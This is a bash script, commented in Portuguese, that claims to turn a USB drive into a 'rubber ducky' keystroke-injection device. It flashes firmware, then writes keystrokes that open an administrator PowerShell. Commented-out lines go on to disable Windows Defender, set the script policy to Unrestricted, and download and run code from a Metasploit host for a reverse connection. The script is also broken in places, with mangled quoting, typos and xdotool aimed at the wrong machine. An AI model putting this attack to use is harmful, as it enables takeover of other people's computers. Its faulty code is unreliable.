#!/bin/bash

# Instalar as dependências necessárias
sudo apt-get update
sudo apt-get install git build-essential xdotool

# Clone o repositório do firmware Duck Encoder
git clone https://github.com/hak5darren/USB-Rubber-Ducky.git

# Compile o firmware Duck Encoder
cd USB-Rubber-Ducky/Encoder/
make

# Grave o firmware no dispositivo USB
cd ..
sudo ./ducky-flasher -w firmware.bin -i /dev/sdb

# Crie um script em bash com os comandos de teclado desejados
echo "#!/bin/bash" > script.sh
echo "sleep 5" >> script.sh
echo "xdotool key super" >> script.sh # pressione a tecla do Windows
echo "xdotool type 'powershell'" >> script.sh # digite "powershell"
echo "xdotool key Return" >> script.sh # pressione a tecla Enter
echo "sleep 1" >> script.sh
echo "xdotool key super" >> script.sh # pressione a tecla do Windows
echo "xdotool type 'powershell'" >> script.sh # digite "powershell"
echo "xdotool key Return" >> script.sh # pressione a tecla Enter
echo "xdotool type 'Start-Process powershell -Verb runAs'" >> script.sh # digite o comando para abrir o PowerShell como administrador
echo "xdotool key Left" >> script.sh # pressione a tecla Left
echo "xdotool key Return" >> script.sh # pressione a tecla Enter
echo "xdotool type 'Start-Sleep -Seconds 5'" >> script.sh # Aguarda a janela do PowerShell abrir
echo "xdotool key Return" >> script.sh # pressione a tecla Enter
######################################################################################## Insersão dos Codigos para rodar no Powershell em modo admin:
#echo "xdotool type 'Set-MpPreference -DisableRealtimeMonitoring $truen'" >> script.sh # Desativa o Windows Defender
#echo "xdotool key Return" >> script.sh # pressione a tecla Enter
#echo "xdotool type 'Set-ExecutionPolicy Unrestricted -Scope LocalMachin'" >> script.sh # Muda a Politica de Eecução de Scripts
#echo "xdotool key Return" >> script.sh # pressione a tecla Enter
#echo "xdotool type 'A'" >> script.sh # digite A
#echo "xdotool key Return" >> script.sh # pressione a tecla Enter
#echo "xdotool type '$uri = "http://[seu endereço IP]:[porta escolhida]/[caminho escolhido no Metasploit]"'" >> script.sh 
#echo "xdotool key Return" >> script.sh # pressione a tecla Enter
#echo "xdotool type '$uri = "Invoke-Expression ((New-Object Net.WebClient).DownloadString($uri))"'" >> script.sh  # Executa o comando para estabelecer a conexão reversa
#echo "xdotool key Return" >> script.sh # pressione a tecla Enter

# Copie o script para o dispositivo USB
cp script.sh /media/user/USBDRIVE/

# Ejecta o dispositivo USB com segurança
sudo umount /dev/sdb

echo "O pendrive foi transformado em um rubber ducky com sucesso!"
